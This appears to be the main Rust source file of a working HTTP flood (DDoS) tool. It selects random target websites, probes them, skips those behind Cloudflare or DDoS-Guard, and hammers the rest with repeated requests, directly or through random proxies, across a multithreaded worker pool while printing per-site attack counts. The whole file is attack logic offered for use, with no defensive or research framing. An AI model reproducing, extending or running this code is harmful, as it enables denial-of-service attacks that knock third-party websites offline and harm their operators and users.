mod client;
mod provider;
mod settings;
use provider::site::Site;
use rand::seq::IteratorRandom;
use rand::seq::SliceRandom;
use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use std::sync::RwLock;
use std::thread;
use std::time::Duration;
use threadpool::ThreadPool;

fn update_attack_counter(
    counter_map: &Arc<RwLock<HashMap<Site, u64>>>,
    site: &Site,
    attack_count: u64,
) {
    match counter_map.write() {
        Ok(mut count_map) => {
            *count_map.entry(site.clone()).or_insert(0) += attack_count;
        }
        Err(_) => {}
    }
}

fn load_attack_count(counter_map: Arc<RwLock<HashMap<Site, u64>>>) {
    loop {
        match counter_map.write() {
            Ok(mut count_map) => {
                println!("===========TOTAL SITE ATTACKS STATISTICS===========");
                for (key, value) in count_map.iter() {
                    println!("SITE {:?} TOTAL ATTACKS {:?}", key.page, value)
                }
                count_map.clear();
                println!("===========STATISTICS END===========");
            }
            Err(_) => {}
        }
        thread::sleep(Duration::from_secs(settings::READ_STATISTICS_INTERVAL));
    }
}

fn show_protected_sites(ddos_protected_sites: Arc<RwLock<HashSet<Site>>>) {
    loop {
        match ddos_protected_sites.write() {
            Ok(mut ddos_protected) => {
                if !ddos_protected.is_empty() {
                    println!("DDOS PROTECTED SITES");
                    for site in ddos_protected.iter() {
                        println!("SITE PROTECTED FROM DDOS {:?}", site.page)
                    }
                    ddos_protected.clear();
                }
            }
            Err(_) => {}
        }
        thread::sleep(Duration::from_secs(settings::READ_STATISTICS_INTERVAL));
    }
}

fn append_ddos_protected(ddos_protected_sites: &Arc<RwLock<HashSet<Site>>>, site: &Site) {
    match ddos_protected_sites.write() {
        Ok(mut protected_sites) => {
            protected_sites.insert(site.clone());
        }
        Err(_) => {}
    }
}

fn detect_ddos_protection(probe: &isahc::Response<isahc::Body>) -> bool {
    match probe.headers().get("server") {
        Some(value) => {
            if value.eq("cloudflare") {
                return true;
            }
            if value.eq("ddos-guard") {
                return true;
            }
        }
        None => {}
    }
    return false;
}

fn flood_action(
    counter_map: &Arc<RwLock<HashMap<Site, u64>>>,
    ddos_protected_sites: &Arc<RwLock<HashSet<Site>>>,
) {
    let sites = provider::get_target_sites();
    let site = sites.choose(&mut rand::thread_rng()).unwrap().clone();

    let mut count_attacks_for_current_site = 0;
    match client::fetch(&site, None) {
        Ok(probe) => {
            if detect_ddos_protection(&probe) {
                append_ddos_protected(&ddos_protected_sites, &site);
                update_attack_counter(&counter_map, &site, 0);
                return;
            }
            if probe.status().as_u16() >= 302 {
                let proxies = provider::load_proxies();
                let sampled_proxies = proxies.iter().choose_multiple(&mut rand::thread_rng(), 50);

                for proxy in sampled_proxies {
                    if count_attacks_for_current_site >= settings::MAX_REQUESTS_TO_SITE {
                        update_attack_counter(&counter_map, &site, count_attacks_for_current_site);
                        return;
                    }

                    match client::fetch(&site, Some(proxy.clone())) {
                        Ok(proxy_response) => {
                            let response_status = proxy_response.status().as_u16();

                            if response_status >= 200 && response_status <= 302 {
                                while count_attacks_for_current_site
                                    < settings::MAX_REQUESTS_TO_SITE
                                {
                                    let response_status =
                                        match client::fetch(&site, Some(proxy.clone())) {
                                            Ok(response) => response.status().as_u16(),
                                            Err(_) => 503, // if connection error service unavailable and response is 503
                                        };
                                    if response_status >= 403 {
                                        update_attack_counter(
                                            &counter_map,
                                            &site,
                                            count_attacks_for_current_site,
                                        );
                                        return;
                                    }
                                    count_attacks_for_current_site += 1;
                                }
                            }
                        }
                        Err(_) => {}
                    }
                }
                update_attack_counter(&counter_map, &site, count_attacks_for_current_site);
            } else {
                while count_attacks_for_current_site < settings::MAX_REQUESTS_TO_SITE {
                    let response_status = match client::fetch(&site, None) {
                        Ok(response) => response.status().as_u16(),
                        Err(_) => 503, // if connection error service unavailable and response is 503
                    };
                    if response_status >= 403 {
                        update_attack_counter(&counter_map, &site, count_attacks_for_current_site);
                        return;
                    }
                    count_attacks_for_current_site += 1;
                }
                update_attack_counter(&counter_map, &site, count_attacks_for_current_site);
            }
        }
        Err(_) => {}
    }
    update_attack_counter(&counter_map, &site, count_attacks_for_current_site);
}

fn run_flood_loop(
    counter_map: Arc<RwLock<HashMap<Site, u64>>>,
    ddos_protected_sites: Arc<RwLock<HashSet<Site>>>,
) {
    loop {
        flood_action(&counter_map, &ddos_protected_sites);
    }
}

fn main() {
    println!("WORKING. WAIT FOR STATISTICS...");
    let counters_map = Arc::new(RwLock::new(HashMap::new()));
    let ddos_protected_sites = Arc::new(RwLock::new(HashSet::new()));
    let counter_map_clone = Arc::clone(&counters_map);
    let counter_thread = thread::spawn(move || load_attack_count(counter_map_clone));
    let ddos_protected_clone = Arc::clone(&ddos_protected_sites);
    let check_ddos_thread = thread::spawn(move || show_protected_sites(ddos_protected_clone));
    let pool = ThreadPool::new(settings::MAX_WORKERS);
    for _ in 1..settings::MAX_JOBS {
        let counters_map_clone = Arc::clone(&counters_map);
        let ddos_protected_clone = Arc::clone(&ddos_protected_sites);
        pool.execute(move || {
            run_flood_loop(counters_map_clone, ddos_protected_clone);
        });
    }
    counter_thread.join().unwrap();
    check_ddos_thread.join().unwrap();
    pool.join()
}
